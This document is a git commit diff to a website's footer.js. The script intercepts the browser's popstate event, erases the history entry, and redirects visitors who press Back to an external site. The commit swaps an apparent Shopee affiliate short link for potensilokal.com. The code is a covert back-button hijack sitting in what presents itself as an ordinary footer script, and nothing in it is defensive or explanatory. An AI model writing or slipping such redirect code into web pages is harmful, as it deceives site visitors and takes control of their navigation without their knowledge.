5ed33a5217ac9710c29efd1e372f38697786d46b
Dedexz R Comotecyn <jengkeran@gmail.com>
2025-05-16 19:02:09 +0700

    Update footer.js

--- footer.js
+++ footer.js
@@ -6,7 +6,7 @@ window.addEventListener("popstate", function() {
   if(location.hash === "#!/history") { 
     history.replaceState(null, document.title, location.pathname); 
     setTimeout(function(){ 
-      location.replace("https://shope.ee/1Aurcqlsen"); 
+      location.replace("https://potensilokal.com"); 
     },10); 
   } 
 }, false); 
